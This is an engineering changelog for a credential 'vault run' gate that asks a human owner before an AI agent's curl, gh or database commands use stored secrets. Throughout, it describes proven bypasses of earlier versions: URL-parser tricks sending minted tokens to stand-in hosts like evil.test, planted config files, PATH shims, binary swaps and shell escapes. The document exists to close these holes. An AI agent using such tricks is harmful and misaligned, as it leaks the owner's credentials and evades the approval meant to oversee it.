### vault-agent-own (acceptance rounds 20–26, the readable run card, the output scrubber, the one tool-true URL parser, riding train C) — the chain's user-facing engineering bullets (the earlier r6–r19 reader/grammar work is in the `acceptance rounds, on 2.369.357 bbca26b4` sub-section below, under this same heading — it was driven on .357/.359 but, rebased onto 2.369.360, rides this release with the rest of the chain):
- **The run ask card is structured facts, not an English prose wall (r20, r23 v2).** The owner said «这个卡片的可读性很差». The record gains a `facts` field written by PURE `cardFactsOf` and rendered by the client in the viewer's language from CODES in closed exported tables — a value is never a sentence. r23 (a facts client never shows `detail`): the facts carry everything the approval rests on — each shown template's TEXT, the plain env, and per-secret own/provenance/forHost/sendsTo + a reason (minted for X, sent to Y) — and every string is bounded to the client store's 2000-char limit with a chunked fold, so a long command files instead of `ask_unfiled`, and `facts.cmd` shows what RUNS (value-based, not the name-belted head.cmd that hid the agent's own `-d password=…`).
- **A late «allow once» still counts, for the EXACT command (r20b, r23).** An unanswered card (60 s ⇒ `ask_expired`) stays open as a `late` card for 24 h; a late allow writes a one-run pass the next run of THAT exact command spends with no card (r23: keyed on the literal command, not the shape — `curl …/api/stat` allowed never lets `…/api/DELETE-everything` through). The item settles in the shape the client reads (`resolvedBy` = the outcome + `resolvedFact.decidedBy` 'person'/null); the 24 h counts from the first expiry; a late answer of an ended conversation is `conversation_gone`; the one-card bound holds across a restart.
- **The run output scrubber is value-only and never drops a byte (r21, fb-93219e801a; r23 cut-tail).** The owner's agent got 1008 bytes of «redacted» for a 10 KB JSON — the name-based belt had run over the child's own output. The run output is value-based only; at a cut only the trailing bytes that could be a half value are placeholdered (view-safe), a clean tail arrives clean.
- **The generic name-based belt types a value only where a parser does (r22, B-5a9a; r23 scope).** A bool/number/null under a secret-named `:` key (JSON/YAML) stays; but on a dotenv / shell / `--flag=value` / bare `NAME=value` line every value is a STRING redacted whole — a numeric password `DB_PASSWORD=84726193` is a secret, and a `)` / `,` in a password no longer leaks its tail.
- **A config template's route directive is read by the one parser or it is blind (r23, reopened r19 item 1).** Inside a curl `-K` template a `url`/`proxy`/socket directive whose host the WHATWG parser rejects (a numeric last label, a 64-char label, an empty proxy host) is now BLIND — «always» withheld, the directive named — never a dropped host (curl would still dial it); the route-directive census is derived from `curl --help all`. A non-ASCII whitespace inside a URL token is kept in the token so the parser rejects it (bad_host), never read as the host before it.
- **The ONE URL parser agrees with the TOOL, not the WHATWG spec (r24).** An authority holding a backslash, a percent-escape, a control / space or a non-ASCII byte — or one that re-serialises to a different host than its raw host-part (a self-normalising re-parse, so a default port / trailing dot / case never false-blinds) — is BLIND: `urlHosts` names no host, `urlHostsBad` is true, `routeHosts` stays clean, and the reader never tries to out-parse the tool. The `\`-before-`@` form (wire-proven on the real curl 8.18) read the WHATWG host while curl kept it as userinfo and dialled the other host; `blindAuthority` fenced the wire but `routeHosts` had NAMED the false host (the int-C grant hazard). No over-blinding — a plain host, an `ssh git@`, a `#@` fragment, a default port are unchanged.
- **Every route reader goes through the ONE parser; a scheme-shaped token is never a bare host; the belt proves its document (r25).** cfgRouteHosts' proxy / preproxy / socks* / connect-to branch no longer parsed with a hand regex that read the host after the LAST `@` and ignored `#` / `?` (`proxy = evil.test#@own.example` named own.example while the real curl dialled evil.test, wire-proven on loopback) — every route value now runs through `cfgBareOrUrl → urlParse`, cut at the first `/ ? #`, under the backslash / userinfo / unsafe-byte law, an IPv6 bracket parsed as such or blind. A one-slash `http:/host` or any `scheme:` form is read as the tool reads it or BLINDS (a scheme word like «http» is never a host, so a host-named pass for «http» is refused at mint). ONE option table serves argv and the config reader (`dns-servers` / `interface` no longer slip through as always=true), the route-directive census derives its category from the argument type (not a hand list of 11) and SKIPs on a curl-version mismatch (red on CI retired). The generic name-based belt keeps a typed bool / number / null only inside a JSON object or a YAML mapping it can PROVE — never a header / prose / lone `NAME: value` line (a numeric `Password: 84726193` is redacted whole). MINORs: facts v2 marks + folds every clipped string (a plain-env value, `always.directive`, a secret's name / entry / ref — no silent 2000-char clip); a near-identical rerun's card NAMES the one difference (argument order / a space / the folder / an env var); a `conversation_gone` late answer settles conversation-gone (decidedBy null). The chain was rebased onto 2.369.360 (90c995a3) with no squash; the vault-totp-add seam kept the «Kept by agents» help on `VK.CATEGORIES`.
- **The withholding reasons are a SET, the scheme-word rule reaches every route reader, and a bare-v6 resolve address is named not dropped (r26, the r25 delta verdict: one blocker + one major).** BLOCKER (measured on the real int361 door): the r25 noAlways ladder put `opaque-route` before `program-writable`, so a keyed routing flag MASKED the program-writable fact; int361's ruling-C seam reads `noAlways==='opaque-route'` (readable destination) as «the destination is known», and a standing grant then covered an agent-WRITABLE program named curl given a no-op `--interface lo` / `--resolve h:443:h` / `-x h`. The reasons are now a SET (`noAlwaysAll`), program-writable ranks ABOVE opaque-route (so the existing seam draws the card), and the shape carries `programWritable` so the door's `destinationKnown` reads «known AND not the agent's program» directly (int-C: int361 ANDs `!shape.programWritable`). MAJOR: r25's scheme-word rule was in `targetOf` / `cfgBareOrUrl` but NOT in `routeHostOne` — `proxy = http:/HOST` still named «http» (curl dials HOST, wire-proven), and the `resolve` reader DROPPED a bare IPv6 address curl dials; now `routeHostOne` blinds a scheme-shaped non-`scheme://` token and `routeAddrOne` reads a `--resolve` ADDR as an IP literal (a bare `::1` bracketed, never dropped — a rejected ADDR blinds). Unverified majors + minors: the curl live-drift census says SKIP BY NAME when curl ≠ pinned (the r25 «RED on CI» claim was false — the version-independent coverage leg still runs); the r20–r25 kb INDEX lines moved to the INDEX region's end; the sync-fs census reclassifies `rootOwnedNoWrite` local-only→guarded (it stats the resolved tool on every run); `whyAgain` tests arg-space before arg-order (so a spacing-only rerun is not mislabelled arg-order); a non-routing wget `-e robots=off` no longer shows opaque-route. The facts-fold / whyAgain RENDERER is lane wake-approve-card's (the producer contract — folds + `facts.whyAgain` — is complete here; int-C pins it with a chrome leg on the merged tip).

RED controls on 4ff55fb4 (each round's control fails on the base and passes on the head): a rejected config route directive offers «always» (base) vs withheld+named (head); a dotenv password leaks its tail / a numeric password passes (base) vs redacted whole (head); `facts.cmd` is head.cmd up to 4096 (base, store `ask_unfiled`) vs bounded+folded (head); a late pass keyed on the shape lets a different command through (base) vs its own card (head); the late record is `resolvedBy:'user'` (base) vs the ruled outcome+person (head). test-vault-run 245, test-vault-run-model 203, test-secret-shapes 27, test-exit-run 585, test-peer-text-census 415, test-decision-model 260, test-vault-law 92, test-architecture 857 (§86 vault-run-door.js UNCHANGED at 24), test-ci-gate 82, i18n-check ok.  r24/r25 controls (each fails on a1f79c42, passes on the head): the proxy `#@`/`?@` hand-regex names the host curl does not dial (base) vs blind / the dialled host (head); a one-slash `http:/HOST` is read as «http» and a pass for it leaks a minted value to another host (base) vs blind + 0 bytes on the listener (head); `dns-servers`/`interface` offer «always» (base) vs the option table reads them (head); a header `X-Api-Key: <digits>` / `Password: <digits>` passes in clear (base) vs redacted whole (head); a 2100-char env value / directive clips at 2000 with no marker (base) vs envCut/directiveCut + the fold (head). ### vault-agent-own (acceptance rounds, on 2.369.357 bbca26b4) — the gh reader FAILS CLOSED and the grammar is GENERATED: r6 BLINDS a dash-before-verb / an unknown verb and carries every host-reaching verb of the whole live gh tree (pinned to the runner's gh 2.102.0); r7 fixes two blockers (a gh version mismatch is a NAMED SKIP off-gate / RED on CI, not a hard assert that reddened every other lane's fast tier; the scp-like `git@HOST:O/R` + ssh/https URL spec go-gh accepts, recorded refuted in r6, now asks its host) + two majors (a FromFullName string-TYPEd repo — `issue transfer`, `issue develop --branch-repo` — asks the destination host; GH_BROWSER/GH_EDITOR/GH_PAGER are env_refused, derived from `gh help environment`) + census hygiene (EXTENSION COMMANDS excluded, depth from the grammar, a provable default-host-only verb runs ok:own, `--write` refuses an empty/shrunk grammar; r8 makes `{default:1}` a POSITIVE proof — a no-host verb runs ok:own only if its help (description or examples) names no program-execution / download / git-road word (a pinned list) and no url/path/gist positional, else BLIND: `gh copilot` execs the Copilot CLI on PATH, `gist clone` drives git, `skill update` git-fetches, `extension browse` runs an installer — 25 verbs fell out (195→170), and `GH_PATH` joins env_refused, ⑤c now actually diffs `envHijack` live-vs-shipped, and `repoHostOf` reads a 3-part spec HOST only when it looks like one (no bogus `@feature` card) and strips a leading `www.` as go-gh does; r9 RETIRES the prose proof — the `{default:1}`/host-reaching set is a REVIEWED ALLOWLIST (32 verbs pinned by a help-text HASH, everything else BLINDS: `gh extension create` runs git yet its help names none), `writeGuard` refuses a GROW of the allow set, and `repoHostOf` reads ANY 3-part first segment as the host fail-closed (a one-label `intranet` / an IPv6 literal asks — the r8 looks-like-a-host gate reverted, the over-match fixed at the generator's REPO_NAME criterion); r10 closes the PROGRAM road the allowlist held on the wire for hosts: `--web`/`-w` (19 verbs) and `--editor`/`-e` (4) exec a launcher gh names (its config file's `browser:`/`editor:` key, or `exec.LookPath` on the child's PATH) with the value in env — each is GENERATED per verb into a `launch` set (help-hash pinned) that BLINDS the flag; `pr create` runs `git status` over `core.fsmonitor` and `git push` over the repo's `pre-push`/`core.hooksPath` so it is ok:own ONLY with `--head` AND `-R`/GH_REPO (gh then resolves no CWD repo, `needFlagSubs`); and the RUN ENVIRONMENT becomes the choke point — a runSeal tool (gh) spawns with HOME + GH_CONFIG_DIR at a hub-owned EMPTY dir under data/ (no `~/.config/gh` read, token on env) and a PATH with every same-uid-writable dir dropped (no agent `git`/`xdg-open` shim at the head — the r9 «git from the PATH head» note is moot); `writeGuard` compares the allow SET by NAME (a same-size swap refused), and `--repin --reason` re-pins the version + 32 hashes after a gh roll); r11 makes the run ENVIRONMENT unwritable, not relocated: r10's `data/vault-run-env` was same-uid writable and persistent, so a planted `config.yml` (`http_unix_socket`) or `hosts.yml` leaked the token to the agent's socket / an enterprise host on the next ok:own run (wire-proven on gh 2.102.0) — now HOME + GH_CONFIG_DIR + every XDG_* point at `/nonexistent/vibespace-vault-run` (a path the uid cannot create, so no planted file is read), `GH_HOST` is pinned to the minted `--for` host, gh's `git` child is config-less (GIT_CONFIG_GLOBAL=/dev/null, NOSYSTEM, no prompt), and `GH[_*]ENTERPRISE_TOKEN` + `SSL_CERT_FILE/DIR` + `GIT_SSL_CAINFO` + `CURL_CA_BUNDLE` are refused env names (the off-host-credential + TLS-termination halves); the sealed PATH keeps only existing non-writable dirs re-checked every spawn (NO memo; a not-yet dir the unit bakes is dropped) else `run_path_unsafe` by name; an empty `--head=`/`-R ""` is ABSENT so `pr create` blinds, and r10's «resolves no CWD repo» is corrected (with `--head`+`-R` gh still runs `git remote -v` + two `git config` in the CWD, no status / no push). THE LAW (parked follow-up): ONE unwritable environment for every vault run, each tool's own «no user config» pin — every KNOWN_TOOLS row (git/ssh/curl/wget/aws/gcloud/az/npm/pip/docker/kubectl/psql/mysql/rclone) reads a HOME file naming a program or a destination) — and r12 delivers the first two legs of that law for gh: «cannot write» is OWNERSHIP not mode bits (the sealed PATH keeps ONLY root-owned dirs — uid 0, no group/other write; a uid-owned 0555 dir is DROPPED, its owner chmods at will; empty ⇒ `run_path_unsafe`), the gh binary is pinned by its sha256 DIGEST (`toolSha256` beside `grammarVersion`, re-pinned by `--repin`) so a replaceable uid-owned gh runs only if its bytes match — `tool_changed` else (the owner's own install keeps working; a planted shim never runs), and the agent's env is an ALLOWLIST (GH_REPO/GH_FORCE_TTY/NO_COLOR/CLICOLOR/TERM/LANG/LC_*/TZ + the credential as a GH_TOKEN reference) — every other name `env_refused` by name (`GIT_TRACE2_*`/`SSL_*`/`*_PROXY`/`LD_*` closed without a denylist that can go stale); the DOOR homes the credential to the run's host (GH_TOKEN for github.com / *.ghe.com, GH_ENTERPRISE_TOKEN for a GHES host — the agent names neither, so GHES users regained gh); r13 closes the two TOCTOU holes those legs left (both wire-proven on 8b57e2de): the sealed PATH is now the REALPATH of each surviving entry with every component of the chain root-owned (realpathSync + a per-component check), computed once and cached — an agent-owned PATH entry symlinked to `/usr/bin` passed r12's symlink-following ownership check and was kept BY NAME, then re-pointed to an agent dir AFTER the spawn so gh's git/pager child ran the agent's program with the token; now `/usr/bin` is baked (the link name never appears) and the re-point redirects nothing (this also ends the per-spawn HOME-path stat r11 fixup 1 called for); and the tool is HASHED AND EXEC'D AS ONE OPEN FILE — the door openSyncs the resolved binary once, streams the sha256 over THAT fd, and exec's the SAME inode via `/proc/<pid>/fd` (measured on the pinned gh 2.102.0 Go static binary), so a uid-owned pinned gh swapped between the hash (r12 hashed by path) and the spawn (r12 exec'd by a second path lookup) can no longer redirect what runs — `tool_changed` on a mismatch, `tool_unpinnable` where /proc is absent (the hub is Linux); no inode re-check is needed, the fd IS the executed thing; and the MINOR: GH_HOST + the credential NAME follow the host the VERDICT approved (shape.hosts — the card's host when the call names another), not blindly the mint's `--for` — a value minted --for github.com, approved on a card for a GHES host, now homes to GH_ENTERPRISE_TOKEN + GH_HOST=that host, where r12 pinned github.com + GH_TOKEN and reached nowhere useful; r14 (re-driven at b728667d) fixes what r13's own fd road hid — the fd pins WHICH inode runs, ROOT ownership pins WHAT is in it: a uid-owned («replaceable») pinned gh rewritten IN PLACE after the hash ran the AGENT's bytes with the token in env (O_RDONLY and /proc/<pid>/fd pin the inode, not its content), so a pinned tool now runs with a minted value ONLY when SEALED — its realpath chain is root-owned AND an `fstat` of the OPEN fd is root-owned with no group/other write (`sealedToolReal`) — else `tool_not_sealed` (409, naming the fix: gh must live where only root writes, /usr/bin or /usr/local/bin); the sha256 stays the DRIFT detector (`tool_changed` on a package roll) on a sealed inode, still exec'd via /proc/fd (or by path where /proc is absent — a root-owned inode is unswappable); `tool_unpinnable` is retired. TWO regressions the r13 moved-await introduced: the DIGEST is taken FIRST again (before the verdict, the cap check and any grant spend) so 20 parallel calls from one conversation no longer all see callerRuns 0 — 4 spawn + 16 `too_many_runs` (no await from the cap check to `runs.add`); and a lock DURING the hash is `vault_locked` by name with the once-grant left SPENT (r13 read `entry_unknown`, in BURNED, so `restoreOnce` brought the grant back; now the digest-first return precedes the spend, every await re-checks `vaultState()`/`signal.aborted`, and `restoreOnce` never restores across a moved lock epoch), a gone caller is `caller_gone` with nothing spawned (never spawn-then-stop). BLOCKER: a URL the WHATWG parser REJECTS but Go accepts (a port > 65535, a numeric last label `evil.test.123`, a name > 253 / a label > 63) was silently DROPPED by `urlHosts` — nothing set bad_host, the urlArg route host vanished, and `gh issue view https://evil.test:99999/… -R ghe…` ran ok:own + GH_ENTERPRISE_TOKEN to ghe while gh dropped the port and dialed evil.test (dead-proxy trace); now `normHost` rejects a > 253 name / > 63 label / a `{{var}}`, `urlHostsBad` flags a located token the parser rejects, and a gh `<url>`/`<endpoint>` route position sets `shape.badHost` ⇒ `bad_host` (never a dropped host). BLOCKER: `URL_FIND_RE` ended a token at `"` `<` `>` backtick — bytes curl/wget/WHATWG accept in userinfo and read the host PAST — so `https://good.example`+backtick+`@evil.test/x` on the curl row read good.example ok:own and POSTed the minted value to evil.test; now the locator runs a token to WHITESPACE (`:\/\/\S+`) and `url_userinfo` fires on the host read past the byte. MAJOR: url_userinfo was dodged by a glued `-Rhttps://…` (the `\b` read the scheme as «Rhttps») and `repoHostOf` read the host after the FIRST `@` where go-gh/Go url.Parse read the LAST (`x@ghe:1@evil` → evil.test); now userinfo is judged on the GRAMMAR-split route words and `repoHostOf` reads a scheme spec with `new URL` (last @, port dropped, www. stripped), transcribed as a table test from go-gh's `repository_test.go`. MAJOR: the curl config-file grammar is now curl's own (`parseCfgLine` from `tool_parsecfg.c`, pinned by a table test) so short spellings (`-K`/`-E`/`-b`/`-d`) and an inline `#` comment are read; the file-reading directive table is DERIVED from `curl --help all` and PINNED by a census (`data-urlencode`/`variable` name@file, `header`/`write-out @file`, `netrc`, `url = @file`), a template's `url`/`connect-to`/`resolve`/`proxy` are ROUTE HOSTS (scheme-less included), a `{{var}}` is blind, `location`/`proto-redir` ⇒ noAlways — each withholds «always» and names the directive. MAJOR: `card_too_long` is a CARD's bound — moved into the ask path, so an agent's OWN over-bound body to its OWN host runs by:own (daade1a7 refused it before the verdict). MINORs: url_userinfo on route positions only (a --body / -d mention is never refused); the drift FYI's detail paragraph gained zh/ja and the i18n-check road reads `key:`+`detail:` literals, requires a real dict entry (a comment mention no longer passes), words a gap «missing», and is pinned by a RED-mutant suite; the accepted-limit + the vault-run.js comment that only CLAIMED the bad_host rule are rewritten to what the door now DOES. test-vault-run 216, test-vault-run-model 187, test-architecture 857 (§86 vault-run-door.js UNCHANGED at 24), i18n-check ok. ROUND 20 — the owner read the run ask card and said «这个卡片的可读性很差» (an English prose wall on a Chinese UI). The record gains ONE structured field, `facts`, written by the door (PURE `cardFactsOf(spec, shape, cwd, names)` in src/vault-run.js) and rendered by the client (lane wake-approve-card r7) in the viewer's language with t() keys — CODES from closed exported tables, never sentences (a value is never prose). `facts` = { v:1, who, tool {name, home-relative path, writable}, cmd (the same redacted bytes head.cmd carries), folder (home-relative), secrets [{ name = the Vault-window display name, entry, ref, as {kind: env|file|stdin|arg, name} }], hosts { known, list } | { known:false, why }, shape tool|line, always { offered, why, directive }, templates [{label, bytes, shown}], masking }. The `why` vocabularies are CLOSED and exported for the client to key (test-architecture's i18n road on the client side goes red for a code with no en/zh/ja): ALWAYS_WHY = destination-unknown | program-writable | config-reads | card-too-long | redirect | brace-var | opaque-route | agent-template; HOSTS_WHY = tool-names-none | opaque | config-driven; MASKING = common-encodings; CARD_SHAPES = tool | line (and the aggregate CARD_FACTS_CODES). A ref the door cannot name falls to a short, non-telling id «<field>:<6 hex>» (a 32-bit FNV over the ref id — never the URI, whose row name may itself be telling); paths show relative to home as `~`. `detail` (today's prose) stays byte-unchanged on the record for older clients and is never shown beside `facts`. The door passes `facts` to `userTodos.add` beside `detail`; lane wake-approve-card's user-todos.js keeps the field (this tree's store drops an unknown field, so the door's wiring is proven via a capturing stub, not the stored item). The fixture scripts/fixtures/vault-run-card-facts.json (3 variants) is written by scripts/make-vault-run-card-facts.mjs from cardFactsOf and re-derived by test-vault-run so it never drifts; its bytes are shared with lane wake-approve-card (int-C diff-checks byte-for-byte). test-vault-run 220, test-vault-run-model 197, test-architecture 857 (§86 vault-run-door.js UNCHANGED at 24), i18n-check ok. ROUND 20b — the owner asked what happens when a run card is ignored (60 s ⇒ ask_expired, the card vanished silently) and ruled A: a late «allow once» still counts. Expiry now settles the COMMAND, not the card — at VR.ASK_TTL_MS the agent's run is still refused `ask_expired` (unchanged words), but the For-you item / the chat decision row stays OPEN as a `late` card (`action.late:true`, `lateAt`, `shapeId`; `expiresAt` → lateAt + 24 h) the owner may still answer. A late «allow once» writes a ONE-RUN pass keyed (conversation, shape key) in the door's own `lateOnce` map (beside shortAlways, memory-only, a lock ends it — at int-C it folds into vault-use-grants' once-grant), consumed by the next run of the SAME shape from that conversation with NO card (audited `vault-run-late-allow`), settling the item done via resolveAnswered with `resolvedFact {outcome:'late-allowed', late:true}`; a late «deny» settles denied, a late answer after a lock is vault_locked. A second run of the same shape while the late card is open ⇒ ask_pending, the one card's 24 h countdown restarts (no second card). Bounds: at most one late card per (conversation, shape); a late card unanswered for 24 h settles done «expired» (said — the store's expireDue and a door timer both at the item's expiresAt), and the boot reconcile KEEPS open late cards (re-registers a minimal in-memory ask from the persisted item's `action.late/shapeId` so the owner may still deny it or it expires; a late allow across a restart fails safe — the shape key died with the old process, so the next run shows a fresh card, never an over-permit) while a LIVE card a dead process left is still settled ask-expired. The door writes the late state in-memory (lateOnce/lateAsks/latePair, all cleared by a lock as shortAlways is); the client (lane wake-approve-card r7c) renders the late words and the same two buttons (allow once / deny) and counts down to expiresAt. RED controls on 54f757df: the card vanishes on expiry; a late answer is refused. test-vault-run 235 (+15 late legs + 2 base-behaviour mutants), test-vault-run-model 197, test-vault-law 92, test-architecture 857 (§86 vault-run-door.js UNCHANGED at 24), test-ci-gate 82, i18n-check ok. ROUND 21 (fb-93219e801a, the owner's agent 《设备运维大师》) — the run's output scrubber redacts the VALUES it injected, never a field by its NAME, and never drops a byte. The owner's agent ran a vault-run command and got 1008 bytes of `«redacted»` for a 10 KB JSON response: the door ran the NAME-based `redactLong`/`secret-shapes` pass over the child's ALREADY value-masked output, so the tool's own fields `"key":…` / `"use_auth":false` were redacted by name AND the bare-value rule swallowed the one-line JSON to the line end. FIX: the run output is VALUE-based ONLY — `createRunMasker` (the injected values + encodings) is the whole scrubber; the name-based rules (R2/R5/R6/R7/R8) do NOT run over a child's output (they are for text whose values are UNKNOWN — chat, logs, the group feed, the judge input), so a tool's JSON field named key/auth/token stays (it is the tool's data, not a secret unless its value is injected). NEVER DROP A BYTE: the value-masker's hold is bounded by the longest encoding of the longest injected value (not redactLong's 4096 lookahead, now gone); the held tail is flushed at the stream's end AND at a CUT — on a cut the uncertain window (where a value could be half present in any view) becomes ONE `[vault:…]` placeholder (`createRunMasker.end(cut)`), never dropped silently (the 2 MiB-cut tail used to vanish) nor flushed raw (a half value would leak). B-5a9a: the GENERIC R2's bare value (for the other callers — chat, logs, the feed, the judge) now stops at `,` `}` `]` `)` and the line end so a one-line JSON / a trailing `Password=x,…` is never swallowed whole (a space is still not a delimiter). Docs: kb-design-lessons (THE TWO SCRUBBERS), the agent manual, kb-file-structure. RED controls on 54f757df: the name-based pass over a run's output redacts the tool's `key` field and/or swallows the one-line JSON; a cut flushed raw leaks the half value. test-secret-shapes 21, test-vault-run 239, test-vault-law 92, test-exit-run 585, test-peer-text-census 415, test-vault-run-model 197, test-architecture 857, test-ci-gate 82, i18n-check ok. ROUND 22 (a r21 addendum that missed a51611f2) — the GENERIC name-based pass (chat / logs / the group feed / the judge input; NEVER the run's output, value-based since r21) no longer redacts a value it can TYPE as a non-secret: under a secret-named key, a bare JSON/YAML boolean (true/false), a number, null or an empty string STAYS; every other value stays redacted (fail-closed — «short» is never a reason, a quoted "false" is a string the parser cannot type so it stays redacted, a value the parser cannot type is a secret). One rule in src/secret-shapes.js redactKv (R2), before the redaction. RED on a51611f2: `{"key":false}` was redacted to `{"key":«redacted»}`. Gates: test-secret-shapes 24, test-peer-text-census 415, test-vault-run 239, test-vault-law 92, test-architecture 857, test-ci-gate 82, i18n-check ok.

### vault-agent-own — what an agent stored itself is its own to use: no switch, no grant, no card for its conversation; a minted value asks once per other host; `totp add` / `login add` make a seed and a login real entries (BUILD lane on 2.369.357 bbca26b4; the owner 2026-10-26 「它自己存的使用为啥还要我的允许？」 after three For-you cards for a seed the agent had typed itself)
- **The rule (PURE src/vault-run.js):** `ownsAgentEntry(ref, caller)` — an `agent:<scope>/<name>` entry is the caller's when its scope is the caller's registered id (`scope`, an entry made before this lane) or its durable, fork-safe id (`conv` = addressableId — a pending fork's is null; a caller with no `conv` is read by its conversationId). `runVerdict` takes per-entry `own` / `prov` / `forHost` and `passes`: an own entry is open by construction (no switch); every entry own and nothing bound elsewhere ⇒ `{ok, by:'own'}`; a MINTED own value whose run names a host that is not its `--for` (`sameHost`: the host or one under it — never a lookalike, a dotless `--for` names none) and has no pass ⇒ ask once / deny (`why: ['another-host']`, `away` = [{ref, forHost, host}], no «always»); an entry not its own ⇒ today's road with `why: ['not-own']`, and a live «always» or a seen shape never passes a host. A KNOWN tool naming no host asks nothing (a local command); where the destination CANNOT be told — a shell, an interpreter, a tool outside the table, a routing flag (`keyed`), a config file, project code, an agent-writable program: the shape's new `blind` fact, read from the raw facts because `noAlways` says 'unknown-destination' for a hostless known tool and so hid a config file / a written program — a minted value asks ONCE per command shape (`pass` = `?<shape key>`). `URL_RE`: a `\` ends the userinfo (WHATWG reads `https://evil\@good/` as host evil). The `--for` is the agent's own word (accepted: it is its own minted value).
- **The door (src/server/vault-run-door.js):** another conversation's agent entry is refused `use_not_granted` before any fact of it is read (no switch opens it — the coordinator's answer A: sharing an agent's entry is a grant-door feature, parked); own facts from the row's provenance; host passes `scope × entry × host` in memory (a lock ends them; the 允许 on a host card is that host's pass); the card's detail gains «Stored by: <ref> — this conversation (…) | you» and «Why it asks: another conversation is using it — … | it would go to another host — … minted for X, this run sends it to Y»; `rowFacts` of an agent row = `{can:false, own:true}` (no switch); `list` names the caller's own entries (`by: 'own'`) and never another's; `request` for an own entry ⇒ `already: 'own'` (no card). The run line says `allowedBy: 'own'`; the use line, the scrubber, the refusal tables, the bounds and the lock all stay.
- **Acceptance round 2 (the second commit, 主开发's focus pass — two MAJORs, one MINOR):** (1) a known tool whose host the table did not read sent a MINTED own value with no card (`curl evil.example.com`, `psql "host=…"`, `-hHOST`, `PGSERVICE=…`, `rclone remote:` — hosts=[], blind=false, read as local): `blind` now includes a known tool's `!hosts.size` (every row reaches the network), `unread` targets and the row's `confDest` (git, rclone); shapeOf READS the hidden hosts (getopt clusters via `shortSplit`, `bareHosts` + `targetOf`, `conninfoHosts`, URL_RE's host list, gh `--hostname` / `-R HOST/…`, more value flags so a value is never a target) — on the owner's cards too; `noAlways` 'unknown-destination' when `unread`. (2) a blind shape's pass was kept until the lock after one plain 允许 on a CLUSTER: `awayOf(…, {shapePasses: mode === 'allow'})` marks `keep`; a cluster keeps no shape pass, a live «always» (second password) passes it, a local instance keeps one 允许; the door writes only kept passes and re-judges over this answer's. (3) `request` / `list` say a minted entry's host and that another host or a blind command asks (the CLI words, `mint`'s line, the usage). (4) a parser review of this round READ six more ways a known tool reaches a host the shape missed with no card (all now blind, or the real host read): a URL authority curl/wget percent-decode, IDNA-map or read userinfo past a `\` (`good.com%2eevil.com`, `good.com。evil.com`, `good.com\@evil.com` → `blindAuthority`); curl `--url @file` (reads URLs from a file); wget / psql / mysql long-option abbreviations (`--input-f`, `--exec`, `--hos`, `--comm` — GNU/my_getopt take any unique prefix → resolve to the full flag); psql `-o '|cmd'` (pipes to a shell), and `-d` / `-o` added as value flags; gh `-R HOST/OWNER/REPO` where the host is an IP / a port / a trailing dot (no HOSTNAME gate — gh sends GH_ENTERPRISE_TOKEN there); gh `repo clone|fork|sync` / `pr checkout` / args after `--` (they drive git). Two fail-closed-noise fixes: a Go `-s=url` drops the `=`, a libpq unix-socket path is not a network host. (5) on the way, a base hole: a database client's shell escape (`psql -c '\!…'` — a -c starting with a backslash is a meta-command —, `psql -f`, `mysql -e 'system …'`, sftp `-b`) ran a local shell with the value in its env, under the owner's «always» for `psql -h db -c <word>` too: `scriptFlags` / `escapes` ⇒ `unread` (blind, no «always»), psql -f / sftp -b configFlags, wget `--use-askpass` keyed, PSQLRC in ENV_CONFIG; kubectl `-s` / `--server` read as hosts. Gates: test-vault-run-model 106 (+ the round-2 rows, 7 RED mutants), test-vault-run 163 (+ `curl -s`, shell / `node -e` every run, «always» + password until the lock, local once, RED COPY door), the vault family green, fast tier green.
- **Acceptance round 3 (主开发's skeptics with REAL tools — a THIRD commit on `6127a1a7`; four security residuals, one wrong-key minor, three table gaps, each pre-existing on the base):** (1) curl `--alt-svc <file>` / `--interface` redirect the connection off the URL's host ⇒ `keyed`; a value that is an agent-writable FILE (`--cacert` / `--capath` / `-E` / `--cert` / `--key` / `--netrc-file` / `--hsts` / `--etag-*`) is a `fileFlags` config class ⇒ `configFile` (blind) unless it is the vault's own `$VAULT_FILE` (curl 8.18.0 honoured an agent alt-svc cache and sent the whole request — Authorization + body — to 127.0.0.1). (2) libpq percent-decodes a conninfo URI's query KEYWORDS (`?%68ostaddr=` → `hostaddr=`): `conninfoUriBlind` marks a `%` in a postgres URI's query blind (the plain `?hostaddr=` host is still read; a `%` in the path stays allowed). (3) a network tool's positional that is not a readable target is UNREAD (blind) now, never silently ignored — `targetOf(a, globs, strict)` returns `{unread}` for `bareHosts:'all'` (curl IDNA-maps / percent-decodes / reads past a `\` in a scheme-less positional: `good.com。evil.com`, `good.com%2eevil.com`, `good.com\@evil.com`; the wget twin too). (4) gh verbs that drive git only with a FLAG (`pr merge --delete-branch`, `repo create --push|--clone`) ⇒ new `blindFlagSubs`; `extension install|upgrade` runs code ⇒ `blindSubs`. (5) MINOR (wrong key): gh read EVERY positional as HOST/OWNER/REPO, so `gh api repos/cli/cli` keyed an allow to the bogus host «repos» and `gh release upload v1 ./dist/a/b` went false-blind — only a repo-spec verb (`repo clone|fork|view|sync`) reads `positionals[0]` now (`repoSpecSubs`); `gh api <path>` is a path under the default host, a path segment is never a host. (m1) httpie `--raw <body>` is a value flag (a scheme-less URL after it was shadowed). (m2) wget `--input-metalink` fetches every URL in its file ⇒ configFlags (blind). (m3) `HTTPIE_CONFIG_DIR` / `GH_CONFIG_DIR` / `MYSQL_HOME` / `PGSYSCONFDIR` refused by name in ENV_CONFIG (like `CURL_HOME` / `WGETRC`). Each residual flips a base-`6127a1a7` source copy (22 cases: base `ok:own` / `@repos` / `@?` → `ask` / blind; fixup 5 restores `ok:own`). Still accepted by name (a home-dir config the agent can write, same uid / home): `~/.pg_service.conf` via `PGSERVICE=` / `?service=` / `psql -h x service=y`. Gates: test-vault-run-model 114 (+ the round-3 rows + 8 RED mutants), test-vault-run 163, the vault family green, fast tier green.
